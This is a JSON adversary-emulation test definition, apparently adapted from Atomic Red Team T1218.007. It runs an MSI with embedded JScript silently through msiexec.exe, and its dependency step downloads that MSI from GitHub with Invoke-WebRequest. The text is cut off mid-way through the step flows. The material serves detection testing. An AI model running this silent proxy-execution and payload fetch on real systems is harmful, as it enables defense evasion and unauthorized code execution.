{
  "id": "a059b6c4-e7d6-4b2e-bcd7-9b2b33191a04",
  "name": "Msiexec.exe - Execute Local MSI file with embedded JScript",
  "description": "Executes an MSI containing embedded JScript code using msiexec.exe\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "54e60aaa-020d-4273-a767-ea15277d4fc0",
      "type": "execute-command",
      "data": {
        "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "cc32ab40-ae6a-4c84-a8f0-61d1055f80ce",
      "name": "Check dependency 1/1",
      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "91bc0b41-30d0-47ec-b239-1c2b8fb0c80d",
      "name": "Resolve dependency 1/1",
      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"#{msi_payload}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "75844614-7596-4fab-b501-e94310719017",
      "name": "Re-check dependency 1/1",
      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "cc32ab40-ae6a-4c84-a8f0-61d1055f80ce",
      "p": "on-success",
      "o": "54e60aaa-020d-4273-a767-ea15277d4fc0"
    },
    {
      "s": "cc32ab40-ae6a-4c84-a8f0-61d1055f80ce",
      "p": "on-failure",
